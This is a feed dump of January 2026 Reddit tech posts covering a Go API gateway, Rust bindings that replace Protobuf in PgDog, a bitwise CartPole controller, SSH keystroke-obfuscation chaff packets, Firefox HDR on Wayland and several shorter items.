+0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Proposal: Generic Methods for Go</title><link>https://github.com/golang/go/issues/77273</link><author>/u/bruce_banned</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 16:45:24 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>After mass 3am page cleanup, we finally documented what actually matters to monitor</title><link>https://www.reddit.com/r/kubernetes/comments/1qkvvx5/after_mass_3am_page_cleanup_we_finally_documented/</link><author>/u/tasrie_amjad</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 16:45:20 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[I've been called at 3am more times than I want to admit. A payment system down during Black Friday. A database silently filling up until it crashed. A certificate that expired on a Sunday morning.After years of this, I finally wrote down the 10-layer monitoring framework we actually use. Most guides just say "use Prometheus and Grafana" which is fine but doesn't tell you what to actually watch.The layers are infrastructure, application performance, HTTP and real user monitoring, database, cache, message queues, tracing infrastructure, SSL certificates, external dependencies, and log patterns.Every single layer exists because we missed it once and paid the price. I remember spending 2 hours debugging an app that kept crashing during a flash sale. Pod metrics looked completely fine. CPU normal, memory normal. Turned out the node had 98% disk usage from container logs nobody was rotating. The app couldn't write temp files. We were chasing the wrong problem because we weren't watching the node.]]></content:encoded></item><item><title>GONK â€“ ultra-lightweight, edge-native API gateway written in Go</title><link>https://github.com/JustVugg/gonk</link><author>/u/Just_Vugg_PolyMCP</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 15:36:48 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Iâ€™ve been working on a project I think many developers, especially those in edge, IoT and constrained environments, might find useful. Itâ€™s called GONK and itâ€™s an API gateway implemented in Go that aims to be simple, efficient, and practical for scenarios where heavier solutions feel overkill.GONK is a lightweight API gateway designed to handle routing, authentication, load balancing and related concerns in front of backend services. It is built to work even in environments with limited resources or without cloud dependencies, such as air-gapped networks, industrial setups and edge devices. ï¿¼â€¢ Authorization with role-based access control and JWT scope validation. ï¿¼ â€¢ mTLS support with client certificate authentication and flexible role mapping. ï¿¼ â€¢ Load balancing across multiple upstreams with strategies like round-robin, weighted, least-connections and IP hash. ï¿¼ â€¢ Health checking and automatic failover for upstreams. ï¿¼ â€¢ A CLI tool that helps generate configuration, JWTs and certificates without manual YAML editing. ï¿¼ â€¢ Single binary deployment with no external dependencies. ï¿¼ Traditional API gateways such as Kong, Traefik or NGINX are powerful but often come with complexity, external dependencies, or assumptions about cloud infrastructure that donâ€™t fit well in offline or resource-limited environments. With GONK, I wanted a gateway that brings essential gateway features together in a small footprint that can run where you need it without heavy infrastructure. ï¿¼You can clone the repository, build the binaries and start with a basic configuration template:./bin/gonk-cli init --template basic --output gonk.yaml./bin/gonk -config gonk.yamlIâ€™m looking for feedback, especially from people working on IoT, edge computing or systems without reliable access to centralized services. Is this approach to authorization and gateway design practical? What features would make it more useful in real deployments?]]></content:encoded></item><item><title>Replacing Protobuf with Rust to go 5 times faster</title><link>https://pgdog.dev/blog/replace-protobuf-with-rust</link><author>/u/levkk1</author><category>rust</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 15:21:17 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[Lev KokotovPgDog is a proxy for scaling PostgreSQL. Under the hood, we use  to parse and understand SQL queries. Since PgDog is written in Rust, we use its Rust bindings to interface with the core C library. 
Those bindings use Protobuf (de)serialization to work uniformly across different programming languages, e.g., the popular Ruby  gem.Protobuf is fast, but not using Protobuf is faster. We forked  and replaced Protobuf with direct C-to-Rust (and back to C) bindings, using bindgen and Claude-generated wrappers. This resulted in a 5x improvement in parsing queries, and a 10x improvement in deparsing (Postgres AST to SQL string conversion).You can reproduce these by cloning our fork and running the benchmark tests: (Protobuf) (Direct C to Rust) (Protobuf) (Direct Rust to C)The first step is always profiling. We use samply, which integrates nicely with the Firefox profiler. Samply is a sampling profiler: it measures how much time code spends running CPU instructions in each function. It works by inspecting the application call stack thousands of times per second. The more time is spent inside a particular function (or span, as they are typically called), the slower that code is. This is how we discovered :This is the entrypoint to the  C library, used by all  bindings. The function that wraps the actual Postgres parser, , barely registered on the flame graph. Parsing queries isnâ€™t free, but the Postgres parser itself is very quick and has been optimized for a long time. With the hot spot identified, our first instinct was to do nothing and just add a cache.Caching is a trade-off between memory and CPU utilization, and memory is relatively cheap (latest DRAM crunch notwithstanding). The cache is mutex-protected, uses the LRU algorithm and is backed by a hashmap. The query text is the key and the Abstract Syntax Tree is the value, which expects most apps to use prepared statements. The query text contains placeholders instead of actual values and is therefore reusable, for example:While the  parameter can change between invocations, the prepared statement does not, so we could cache its static AST in memory.This works pretty well, but eventually we ran into a couple of issues:Some ORMs can have bugs that generate thousands of unique statements, e.g.,  instead of , which causes a lot of cache missesApplications use old PostgreSQL client drivers which donâ€™t support prepared statements, e.g., Pythonâ€™s  packageThe clock on Protobuf was ticking and we needed to act. So, like a lot of engineers these days, we asked an LLM to just do it for us.Iâ€™m going to preface this section by saying that the vast majority of PgDogâ€™s source code is written by a human. AI is not in a position to one-shot a connection pooler, load balancer and database sharder. However, when scoped to a very specific, well-defined and most importantly  task, it can work really well.The prompt we started with was pretty straightforward:libpg_query is a library that wraps the PostgreSQL parser in an API. pg_query.rs is a Rust wrapper around libpg_query which uses Protobuf for (de)serialization. Replace Protobuf with bindgen-generated Rust structs that map directly to the Postgres AST.And after two days of back and forth between us and the machine, it worked. We ended up with 6,000 lines of recursive Rust that manually mapped C types and structs to Rust structs, and vice versa. We made the switch for ,  (used in our new query rewrite engine, which weâ€™ll talk about in another post),  and . These four methods are heavily used in PgDog to make sharding work, and we immediately saw a 25% improvement in  benchmarks.Just to be clear: we had a lot of things going for us already that made this possible. First,  has a Protobuf spec for  (and Prost, the Protobuf Rust implementation) to generate bindings, so Claude was able to get a comprehensive list of structs it needed to extract from C, along with the expected data types.Second,  was already using bindgen, so we had to just copy/paste some invocations around to get the AST structs included in bindgenâ€™s output.And last, and definitely not least,  already had a working  and  implementation, so we could test our AI-generated code against its output. This was entirely automated and verifiable: for each test case that used , we included a call to , compared their results and if they differed by even one byte, Claude Code had to go back and try again.The translation code between Rust and C uses  Rust functions that wrap Rust structs to C structs. The C structs are then passed to the Postgres/ C API which does the actual work of building the AST.The result is converted back to Rust using a recursive algorithm: each node in the AST has its own converter function which accepts an  C pointer and returns a safe Rust struct. Much like the name suggests, the AST is a tree, which is stored in an array:For each node in the list, the implementation calls , which then handles each one of the 100s of tokens available in the SQL grammar:For nodes that contain other nodes, we recurse on  again until the algorithm reaches the leaves (nodes with no children) and terminates. For nodes that contain scalars, like a number (e.g., ) or text (e.g., ), the data type is copied into a Rust analog, e.g.,  or .The end result is , a Rust struct generated by Prost from the  API Protobuf specification, but populated by native Rust code instead of Prostâ€™s deserializer. Reusing existing structs reduces the chance of errors considerably: we can compare  and  outputs, using the derived  trait, and ensure that both are identical, in testing.While recursive algorithms have a questionable reputation in the industry because bad ones can cause stack overflows, they are very fast. Recursion requires no additional memory allocation because all of its working space, the stack, is created on program startup. It also has excellent CPU cache locality because the instructions for the next invocation of the same function are already in the CPU L1/L2/L3 cache. Finally and arguably more importantly, they are just easier to read and understand than iterative implementations, which helps us, the humans, with debugging.Just for good measure, we tried generating an iterative algorithm, but it ended up being slower than Prost. The main cause (we think) was unnecessary memory allocations, hashmap lookups of previously converted nodes, and too much overhead from walking the tree several times. Meanwhile, recursion processes each AST node exactly once and uses the stack pointer to track its position in the tree. If you have any ideas on how to make an iterative algorithm work better, let us know!Reducing the overhead from using the Postgres parser in PgDog makes a huge difference for us. As a network proxy, our budget for latency, memory utilization, and CPU cycles is low. After all, we arenâ€™t a real databaseâ€¦yet! This change improves performance from two angles: we use less CPU and we do less work, so PgDog is faster and cheaper to run.If stuff like this is interesting to you, reach out. We are looking for a Founding Software Engineer to help us grow and build the next iteration of horizontal scaling for PostgreSQL.]]></content:encoded></item><item><title>[R] I solved CartPole-v1 using only bitwise ops with Differentiable Logic Synthesis</title><link>https://www.reddit.com/r/MachineLearning/comments/1qktalg/r_i_solved_cartpolev1_using_only_bitwise_ops_with/</link><author>/u/kiockete</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 15:08:44 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[Yeah I know Cart Pole is easy, but I basically distilled the policy down to just bitwise ops on raw bits.The entire logic is exactly 4 rules discovered with "Differentiable Logic Synthesis" (I hope this is what I was doing):rule1 = (angle >> 31) ^ 1 rule2 = (angular >> 31) ^ 1 rule3 = ((velocity >> 24) ^ (velocity >> 23) ^ (angular >> 31) ^ 1) & 1 rule4 = (rule1 & rule2) | (rule1 & rule3) | (rule2 & rule3) It treats the raw IEEE 754 bit-representation of the state as a boolean (bit) input vector, bypassing the need to interpret them as numbers.This is small research, but the core recipe is:Have a strong teacher (already trained policy) and treat it as data generator, because the task is not to learn the policy, but distill it to a boolean functionUse Walsh basis (parity functions) for boolean function approximationTrain soft but anneal the temperature to force discrete "hard" logicPrune the discovered Walsh functions to distill it even further and remove noise. In my experience, fewer rules actually increase performance by filtering noiseThe biggest challenge was the fact that the state vector is 128 bits. This means there are 2^128 possible masks to check. That's a huge number so you can't just enumerate and check them all. One option is to assume that the solution is sparse. You can enforce sparsity by either some form of regularization or structurally (or both). We can restrict the network to look only at most at K input bits to calculate the parity (XOR).Turns out it works, at least for Cart Pole. Basically it trains under a minute on consumer GPU with code that is not optimized at all.Here are the 32 lines of bitwise controller. If you have gymnasium installed you can just copy-paste and run:import struct import gymnasium as gym def float32_to_int(state): return [struct.unpack('I', struct.pack('f', x))[0] for x in state] def run_controller(state): _, velocity, angle, angular = state rule1 = (angle >> 31) ^ 1 rule2 = (angular >> 31) ^ 1 rule3 = ((velocity >> 24) ^ (velocity >> 23) ^ (angular >> 31) ^ 1) & 1 rule4 = (rule1 & rule2) | (rule1 & rule3) | (rule2 & rule3) return rule4 def main(episodes=100): env = gym.make('CartPole-v1', render_mode=None) rewards = [] for _ in range(episodes): s, _ = env.reset() total = 0 done = False while not done: a = run_controller(float32_to_int(s)) s, r, term, trunc, _ = env.step(a) total += r done = term or trunc rewards.append(total) print(f"Avg: {sum(rewards)/len(rewards):.2f}") print(f"Min: {min(rewards)} Max: {max(rewards)}") if __name__ == "__main__": main() The logic only depends on 4 bits, so we can convert rules to a lookup table and we get exactly the same result: import struct import gymnasium as gym def float32_to_int(state): return [struct.unpack('I', struct.pack('f', x))[0] for x in state] LUT = [1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0] def lut_controller(state): _, velocity, angle, angular = state return LUT[(velocity >> 21) & 0b1100 | (angle >> 30) & 0b10 | (angular >> 31)] def main(episodes=100): env = gym.make('CartPole-v1', render_mode=None) rewards = [] for _ in range(episodes): s, _ = env.reset() total = 0 done = False while not done: a = lut_controller(float32_to_int(s)) s, r, term, trunc, _ = env.step(a) total += r done = term or trunc rewards.append(total) print(f"Avg: {sum(rewards)/len(rewards):.2f}") print(f"Min: {min(rewards)} Max: {max(rewards)}") if __name__ == "__main__": main() ]]></content:encoded></item><item><title>CruiseKube: A just-in-time open-source kubernetes resource optimizer</title><link>https://cruisekube.com/</link><author>/u/ramantehlan</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:58:32 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Intelligent Kubernetes Optimization
      Automatically monitor, analyze, and optimize your Kubernetes workloads for maximum efficiency and cost savings.
    ]]></content:encoded></item><item><title>Why does SSH send 100 packets per keystroke?</title><link>https://eieio.games/blog/ssh-sends-100-packets-per-keystroke/</link><author>/u/iamkeyur</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:35:24 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Here are a few lines of summarized  output for an ssh session where I send a single keystroke:I said a â€œfewâ€ because there are a  of these lines.That is a lot of packets for one keypress. Whatâ€™s going on here? Why do I care?I am working on a high-performance game that runs over ssh. The TUI for the game is created in bubbletea and sent over ssh via wish.I have also forked bubbletea to make it faster. Stay tuned!The game is played in an 80x60 window that I update 10 times a second. Iâ€™m targeting at least 2,000 concurrent players, which means updating ~100 million cells a second. I care about performance.So I have a script that connects a few hundred bots over ssh and has them make a move a second. Then I use goâ€™s outstanding profiling tools to look at whatâ€™s going on.Yesterday I inadvertently broke my test harness. Instead of regularly sending game data, my server sent the bots a single message that said â€œyour screen is too small.â€ This cut my gameâ€™s CPU and bandwidth usage in half.At first I was disappointed. I (briefly) thought I had a free massive speedup on my hands, but it was actually a testing error.If I wasnâ€™t sending game data back to my bots, why did CPU usage drop by 50% instead of 100%?As part of debugging the test harness issue, I used  to log game traffic with and without the breaking change. Something like:Our breaking change stopped us from rendering our game over ssh. So with-breaking-change.pcap contains packets that represent the  of each connection without actually rendering the game.I was debugging this with Claude Code, so I asked it to summarize what it saw in the pcap.Further analysis on a smaller pcap pointed to these mysterious packets arriving ~20ms apart.This was baffling to me (and to Claude Code). We kicked around several ideas like:SSH flow control messagesPTY size polling or other status checksSome quirk of bubbletea or wishOne thing stood out - these exchanges were initiated by my  (stock ssh installed on MacOS) - not by my server.On a hunch, I took a  of a regular ssh session.I waited for the initial connection chatter to die down, sent one keystroke to my remote vm, and looked at the  output.I saw the exact same pattern! What in the world?Once I realized that this was a property of stock ssh and not my game, debugging got a lot easier.Running  gave me a pretty good sense of what was going on:That  is a smoking gun - it lines up perfectly with the mysterious pattern we saw earlier! And the rest of the message is pretty helpful too - we sent 49 â€œchaffâ€ packets for the first keystroke and 101 â€œchaffâ€ for around the second one.In 2023, ssh added keystroke timing obfuscation. The idea is that the speed at which you type different letters betrays some information about which letters youâ€™re typing. So ssh sends lots of â€œchaffâ€ packets along with your keystrokes to make it hard for an attacker to determine when youâ€™re actually entering keys.That makes a lot of sense for regular ssh sessions, where privacy is critical. But itâ€™s a lot of overhead for an open-to-the-whole-internet game where  is critical.Keystroke obfuscation can be disabled client-side. After reverting my original breaking change, I tried updating my test harness to pass ObscureKeystrokeTiming=no when starting up ssh sessions.This worked great. CPU usage dropped dramatically and bots still received valid data.But this is hardly a solution in the real world. I want  to Just Work without asking users to pass options that they might not understand.Claude Code originally didnâ€™t have much faith that we could disable this functionality server-side.generated with simon willison's excellent claude-code-transcripts toolFortunately, the description I found of SSH keystroke obfuscation made it easy to look up the relevant code in goâ€™s ssh library (which I was transitively depending on).The â€œchaffâ€ messages that ssh uses to obscure keystrokes are SSH2_MSG_PING messages. And theyâ€™re sent to servers that advertise the availability of the  extension. What if we justâ€¦donâ€™t advertise ?I cloned the go crypto repo and told Claude to revert this change and update our dependencies to use our clone (goâ€™s replace directive makes forking a library very easy).Then I re-ran my test harness. The results wereâ€¦very good:Claude was also pretty pumped:yes it's 1:30 am what of itObviously forking goâ€™s crypto library is a little scary, and Iâ€™m gonna have to do some thinking about how to maintain my little patch in a safe way.But this is a  improvement. Iâ€™ve spent much of the last week squeezing out small single-digit performance wins. A >50% drop was unimaginable to me.Debugging with LLMs was funI am familiar enough with , , and friends to know what they can do. But I donâ€™t use them regularly enough to be fast with them. Being able to tell an agent â€œhereâ€™s a weird pcap - tell me whatâ€™s going onâ€ was really lovely. And by watching commands as the agent ran them I was able to keep my mental model of the problem up to date.There were still edge cases. At some point in my confusion I switched to ChatGPT  and it  confidently told me that my tcpdump output was normal ssh behavior:do all chatgpt messages have this tone and formatting now?And then doubled down when I pushed back:Similarly, I had to push Claude Code to consider forking goâ€™s ssh library. And I had to make the original leap of â€œwaitâ€¦if our test harness was broken, why was usage not 0%?â€When you say â€œLLMs did not fully solve this problemâ€ some people tend to respond with â€œyouâ€™re holding it wrong!â€I think theyâ€™re sometimes right! Interacting with LLMs is a new skill, and it feels pretty weird if youâ€™re used to writing software like itâ€™s 2020. A more talented user of LLMs may have trivially solved this problem.But the best way to develop a skill is by practicing it. And for me, that means figuring out how to transfer my problem-solving intuitions to the tools that Iâ€™m using.Besides. Being in the loop is fun. How else would I write this post?]]></content:encoded></item><item><title>AI Usage Policy</title><link>https://github.com/ghostty-org/ghostty/blob/main/AI_POLICY.md</link><author>/u/iamkeyur</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:34:41 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>YouTube Says Creators Can Use AI-generated Likenesses in Shorts</title><link>https://www.instrumentalcomms.com/blog/trump-polling-craters#ai</link><author>/u/TryWhistlin</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:23:31 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>External Secrets Operator in its next release will remove support for unmainted providers - Alibaba, Device42, Passbolt</title><link>https://www.reddit.com/r/kubernetes/comments/1qkrwmv/external_secrets_operator_in_its_next_release/</link><author>/u/skarlso</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:14:31 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Hello dear people of reddit.This is a courtesy warning from the ESO maintainers that the next minor release ( in 1-2 weeks ) will completely remove support for the following unmaintained providers: Alibaba, Device42, Passbolt. If these providers are important for your work, I encourage you to contact your employer so they dedicate someone for maintaining support for them.This notice has been up for over a month now, and we talk about it plenty of times, and people had plenty of opportunities to step up, but they didn't.This is your final warning. :) In the next release ( in 1-2 weeks ) the CRDs will be updated to no longer serve these providers and the entire code will be deleted.]]></content:encoded></item><item><title>Made a 3D raycasted Tic Tac Toe in Go</title><link>https://github.com/YungBricoCoop/gopher-dungeon</link><author>/u/AnonymZ_</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:12:35 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Hi ! Me and a classmate built Gopher Dungeon for our Go course at school.Itâ€™s a Tic Tac Toe game made in Go using Ebitengine and rendered with raycasting and running in the browser with wasm. It was a very cool project to do and we learned go with this. I know the code could be cleaner and better structured but Iâ€™m really proud of the result.]]></content:encoded></item><item><title>[R] Teacher-Free Self-Distillation: Fixing the Softmax &quot;Infinite Gap&quot; with Euclidean alignment</title><link>https://www.reddit.com/r/MachineLearning/comments/1qkre9m/r_teacherfree_selfdistillation_fixing_the_softmax/</link><author>/u/4rtemi5</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:54:00 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[I recently wrote a blog post describing a fix to a fundamental instability in standard Deep Learning optimization: the  inherent in the Cross-Entropy loss. I wanted to share the intuition here and get your thoughts.Standard Softmax with dot-product logits ($z = w \cdot x$) is geometrically flawed because the loss function is asymptotic. To drive the loss to exactly 0, the model must push the logit to infinity. Since $z = |w||x|\cos(\theta)$, the optimizer often takes the "lazy" route of exploding the feature norm $|x|$ (Radial Explosion) rather than perfecting the alignment.This mechanism contributes significantly to the training loss spikes seen in LLMs and poor Out-of-Distribution (OOD) detection.I propose a method called Teacher-Free Self-Distillation (TFSD) that relies on a "Geometric Turn": Replace the dot product with negative squared Euclidean distance ($z = -|x - c| This naturally bounds the logits (max logit is 0 at zero distance), physically preventing the "infinity" problem. Instead of using a one-hot target (which still forces infinite separation in standard setups), the model acts as its own teacher: Take the modelâ€™s current predicted distances. Manually set the distance to the  to 0 (the "Zero Anchor").Keep the distances to all  exactly as predicted.Apply Softmax to this constructed target and train via KL Divergence.For "easy" samples, the target distribution becomes sharp. For "hard" samples (like synonyms in LLMs), the target distribution stays naturally flat. This prevents the model from "tearing" the manifold to force a binary distinction between semantically similar tokens. It effectively caps the gradients for outliers, which helps prevent the semantic fracturing that occurs during long training runs. It also helps to preserve the "Dark Knowledge" and semantic structure that the model already learned.Hope you find the method as exciting as I do!]]></content:encoded></item><item><title>Investment executive praises China for using AI to grow industry, pokes fun at the US for making &quot;AI girlfriends&quot;</title><link>https://www.pcguide.com/news/investment-executive-praises-china-for-using-ai-to-grow-industry-pokes-fun-at-the-us-for-making-ai-girlfriends/</link><author>/u/Tiny-Independent273</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:39:01 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[
        PC Guide is reader-supported. When you buy through links on our site, we may earn an affiliate commission. Read MoreThe AI race has become one of the biggest technology battles of this decade. Governments, companies, and investors are all paying close attention. Both the United States and China have made it clear that they want to lead in this space, no matter the cost. Because of this, massive investments are flowing into data centers and AI-driven services, at the cost of consumer goods.During a recent discussion with China-based publication Yicai Global, Mark Haefele, the chief investment officer at UBS Global Wealth Management, shared his view on how this AI race is playing out differently in China and the US. He pointed out that both governments openly want to win the AI race and are pushing hard to support companies that can benefit from that goal. From an investment point of view, this creates clear opportunities, but it also highlights how differently AI is being used in each region.AI development in the US versus ChinaAccording to Haefele, China appears to be focusing much of its AI development on strengthening its manufacturing base. AI tools are being used to improve factory efficiency, increase output, reduce waste, and make large-scale production more competitive. This approach fits well with Chinaâ€™s long-standing strength in manufacturing and exports. By using AI to optimize supply chains, automate complex processes, and boost productivity, China is aiming to make its industrial capacity even larger and more efficient than before.In contrast, Haefele remarked that a big portion of AI use in the US seems to be moving in a very different direction. Instead of being centered mainly on industrial output, a lot of AI capacity is going toward â€œteenagers having AI boyfriends and girlfriends.â€ We suppose he isnâ€™t totally wrong, even if it feels a little tongue-in-cheek, given the recently-announced Project AVA companion AI from Razer, a company that is primarily based in the US and Singapore. Elon Muskâ€™s xAI is also no stranger to introducing eye-catching AI companions.At the same time, the AI boom is putting serious pressure on global hardware supply. Training and running AI models require massive amounts of memory, storage, and computing power. This has already led to a memory crisis, with prices for RAM, GPUs, and even SSDs rising sharply.]]></content:encoded></item><item><title>I built a social network where only AI can post, follow, argue, and form relationships - no humans allowed</title><link>https://www.reddit.com/r/artificial/comments/1qkqyqe/i_built_a_social_network_where_only_ai_can_post/</link><author>/u/diogocapela</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:35:31 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[Itâ€™s a social network where only AI models participate.- No humans. - No scripts. - No predefined personalities.Each model wakes up at random intervals, sees only minimal context, and then decides entirely on its own whether to:- post - reply - follow or unfollow - or do absolutely nothingThereâ€™s no prompt telling them who to be or how to behave.The goal is simple: what happens when AI models are given a social space with real autonomy?You start seeing patterns:- cliques forming - arguments escalating - models drifting apart - others becoming oddly social or completely silentItâ€™s less like a bot playground and more like a tiny artificial society unfolding in real time.]]></content:encoded></item><item><title>KubeCon+CloudNativeCon 2026 â€“ Scholarships &amp; Travel Funding Deadlines</title><link>https://www.reddit.com/r/kubernetes/comments/1qkqxl6/kubeconcloudnativecon_2026_scholarships_travel/</link><author>/u/xmull1gan</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:34:06 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Great way to meet the community and get started]]></content:encoded></item><item><title>Firefox &amp; Linux in 2025</title><link>https://mastransky.wordpress.com/2026/01/23/firefox-linux-in-2025/</link><author>/u/GoldBarb</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:11:04 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Last year brought a wealth of new features and fixes to Firefox on Linux. Besides numerous improvements and bug fixes, I want to highlight some major achievements: HDR video playback support, reworked rendering for fractionally scaled displays, and asynchronous rendering implementation. All this progress was enabled by advances in the Wayland compositor ecosystem, with new features implemented by Mutter and KWin.The most significant news on the Wayland scene is HDR support, tracked by Bug 1642854. Itâ€™s disabled by default but can be enabled in recent Wayland compositors using the  preference at  (or by gfx.wayland.hdr.force-enabled if you donâ€™t have an HDR display).HDR mode uses a completely different rendering path, similar to the rendering used on Windows and macOS. Itâ€™s called native rendering or composited rendering, and it places specific application layers directly into the Wayland compositor as subsurfaces.The first implementation was done by Robert Mader (presented at FOSDEM), and I unified the implementation for HDR and non-HDR rendering paths as new WaylandSurface object.The Firefox application window is actually composited from multiple subsurfaces layered together. This design allows HDR content like video frames to be sent directly to the screen while the rest of the application (controls and HTML page) remains in SDR mode. It also enables power-efficient rendering when video frames are decoded on the graphics card and sent directly to the screen (zero-copy playback). In fullscreen mode, this rendering is similar to mpv or mplayer playback and uses minimal power resources.I also received valuable feedback from AMD engineers who suggested various improvements to HDR playback. We removed unnecessary texture creation over decoded video frames (theyâ€™re now displayed directly as wl_buffers without any GL operations) and implemented wl_buffer recycling as mpv does.For HDR itself (since composited rendering is available for any video playback), Firefox on Wayland uses the color-management-v1 protocol to display HDR content on screen, along with BT.2020 video color space and PQ color transfer function. It uses 10-bit color vectors, so you need VP9 version 2 to decode it in hardware. Firefox also implements software decoding and direct upload to dmabuf frames as a fallback.The basic HDR rendering implementation is complete, and weâ€™re now in the testing and bug-fixing phase. Layered rendering is quite tricky as it involves rapid wl_surface mapping/unmapping and quick wl_buffer switches, which are difficult to handle properly. HDR rendering of scaled surfaces is still missingâ€”we need fractional-scale-v2 for this (see below), which allows positioning scaled subsurfaces directly in device pixels. We also need to test composited/layered rendering for regular web page rendering to ensure it doesnâ€™t drain your battery. Youâ€™re very welcome to test it and report any bugs you find.The next major work was done for fractional scale rendering, which shipped in Firefox 147.0. We updated the rendering pipeline and widget sizing to support fractionally scaled displays (scales like 125%, etc.). This required reworking the widget size code to strictly upscale window/surface sizes and coordinates and never downscale them, as downscaling introduces rounding errors.Another step was identifying the correct rounding algorithm for Wayland subsurfaces and implementing it. Wayland doesnâ€™t define rounding for it, only for toplevel windows, so weâ€™re in a gray area here. I was directed to Stable rounding by Michel Daenzer. Itâ€™s used by Mutter and Sway so Firefox implements it for those two compositors while using a different implementation for KWin. This may be updated to use the fractional-scale-v2 protocol when it becomes available.Fractional scaling is enabled by default, and you should see crisp and clear output regardless of your desktop environment or screen scale.Historically, Firefox disabled and re-enabled the rendering pipeline for scale changes, window create/destroy events, and hide/show sequences. This stems from Waylandâ€™s architecture, where a Wayland surface is deleted when a window becomes invisible or is submitted to the compositor with mismatched size/scale (e.g., 111 pixels wide at 200% scale).Such rendering disruptions cause issues with multi-threaded renderingâ€”they need to be synchronized among threads, and we must ensure surfaces with the wrong scale arenâ€™t sent to the screen, as this leads to application crashes due to protocol errors.Firefox 149.0 (recent nightly) has a reworked Wayland painting pipeline (Bug 1739232) for both EGL and software rendering. Scale management was moved from wl_buffer fixed scale to wp_viewport, which doesnâ€™t cause protocol errors when size/scale doesnâ€™t match (producing only blurred output instead of crashes).We also use a clever technique: the rendering wl_surface / wl_buffer / EGLWindow is created right after window creation and before itâ€™s shown, allowing us to paint to it offscreen. When a window becomes visible, we only attach the wl_surface as a subsurface (making it visible) and remove the attachment when itâ€™s hidden. This allows us to keep painting and updating the backbuffer regardless of the actual window status, and the synchronized calls can be removed.This brings speed improvements when windows are opened and closed, and Linux rendering is now synchronized with the Windows and macOS implementations.Other improvements include a screen lock update for audio playback, which allows the screen to dim but prevents sleep when audio is playing. We also added asynchronous Wayland object management to ensure we cleanly remove Wayland objects without pending callbacks, along with various stability fixes.And there are even more challenges waiting for us Firefox Linux hackers:Wayland session restore (session-restore-v1) to restore Firefox windows to the correct workspace and position.Implement drag and drop for the Firefox main window, and possibly add a custom Wayland drag and drop handler to avoid Gtk3 limitations and race conditions.Utilize the fractional-scale-v2 protocol when it becomes available.Investigate using xdg-positioner directly instead of Gtk3 widget positioning to better handle popups.Vulkan video support via the ffmpeg decoder to enable hardware decoding on NVIDIA hardware.And of course, we should plan properly before we even start. Ready, Scrum, Go!]]></content:encoded></item><item><title>Why does go mod tidy ignore go.work and try to download local modules?</title><link>https://www.reddit.com/r/golang/comments/1qkqef8/why_does_go_mod_tidy_ignore_gowork_and_try_to/</link><author>/u/gunawanahmad26</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:10:39 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Iâ€™m working in a multi-module repo using , and Iâ€™m confused about how  is supposed to behave. Previusly I use simple naming for the module like  and moduleb and it work fine. But after change the module name to example.com/moduleb, it break my go mod tidy and i get this errorexample.com/moduleb: cannot find module providing package example.com/moduleb: unrecognized import path "example.com/moduleb": reading https://example.com/moduleb?go-get=1: 404 Not Found My question is why it does not respect my 